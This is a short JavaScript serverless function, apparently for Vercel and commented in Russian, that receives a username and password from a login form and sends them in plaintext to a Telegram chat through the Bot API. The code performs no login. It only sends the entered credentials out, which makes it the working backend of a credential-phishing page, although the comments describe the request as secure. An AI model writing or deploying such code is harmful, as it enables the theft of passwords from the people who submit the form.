export default async function handler(req, res) {
  // Разрешаем только POST-запросы
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const { username, password } = req.body;

  // Получаем токен и chat_id из секретных переменных окружения Vercel
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({ success: false, error: 'Server configuration error' });
  }

  const message = `🔔 Новая попытка входа:\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;

  try {
    // Безопасный запрос к Telegram Bot API с сервера
    const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const tgData = await tgResponse.json();

    if (tgData.ok) {
      return res.status(200).json({ success: true });
    } else {
      return res.status(500).json({ success: false, error: tgData.description });
    }
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
}